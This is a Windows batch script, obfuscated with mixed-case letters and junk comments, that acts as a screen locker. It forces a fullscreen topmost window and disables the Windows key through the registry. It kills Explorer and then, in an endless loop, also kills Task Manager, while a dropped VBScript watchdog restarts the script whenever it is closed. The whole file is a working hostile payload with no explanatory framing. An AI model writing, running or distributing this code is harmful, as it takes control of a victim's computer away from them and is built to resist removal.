@eChO oFf
sEt "rAnDoM=9*&^*GTt5ytv7f58t69v&*t5f*T%v&T8^%8T"
MoDe cOn cOlS=9999 lInEs=9999
pOwErShElL -cOmMaNd "& {aDd-tYpE -aSsEmBlYnAmE sYsTeM.wInDoWs.FoRmS; [sYsTeM.wInDoWs.FoRmS.sEnDkEyS]::sEnDwAiT('{F11}')}" >nUl 2>&1

REM %rAnDoM% ^&*XyZ123
bReAk oFf

REM Force stay on top and fullscreen
pOwErShElL -cOmMaNd "& {Add-Type '[DllImport(\"user32.dll\")]public static extern int SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int y, int cx, int cy, int uFlags);' -Name a -Pas; $h = (Get-Process -Id $pid).MainWindowHandle; [a]::SetWindowPos($h, -1, 0, 0, 0, 0, 0x43)}" >nUl 2>&1

REM Disable Windows key and close Explorer
rEg aDd "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f >nUl 2>&1
tAsKkIlL /f /im explorer.exe >nUl 2>&1

REM Create a watchdog to restart if closed
eChO @eChO oFf > wAtCh.vBs
eChO :lOoP >> wAtCh.vBs
eChO SeT wSh = cReAtEoBjEcT("WScript.Shell") >> wAtCh.vBs
eChO If NoT wSh.ApPExEcUtE("cmd.exe /c %~nx0") Then >> wAtCh.vBs
eChO wSh.RuN "%~nx0" >> wAtCh.vBs
eChO EnD iF >> wAtCh.vBs
eChO wScRiPt.SlEeP 1000 >> wAtCh.vBs
eChO GoTo lOoP >> wAtCh.vBs
sTaRt "" /b cScRiPt //nOlOgO wAtCh.vBs

:lOoP
cOlOr 0F
ClS
REM %rAnDoM% *^&%GhJkL

REM Block Task Manager and Explorer restarts
eChO @eChO oFf > tEmP3.vBs
eChO sEt wSh = cReAtEoBjEcT("WScript.Shell") >> tEmP3.vBs
eChO wSh.rUn "cmd /c taskkill /f /im taskmgr.exe", 0, fAlSe >> tEmP3.vBs
eChO wSh.rUn "cmd /c taskkill /f /im explorer.exe", 0, fAlSe >> tEmP3.vBs
cScRiPt //nOlOgO tEmP3.vBs
DeL tEmP3.vBs

TiMeOuT /t 1 >nUl
gOtO lOoP

REM Cleanup on exit (only reachable via external kill)
:eXiT
rEg dElEtE "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /f >nUl 2>&1
TaSkKiLl /f /im cscript.exe >nUl 2>&1
dEl wAtCh.vBs
eXiT
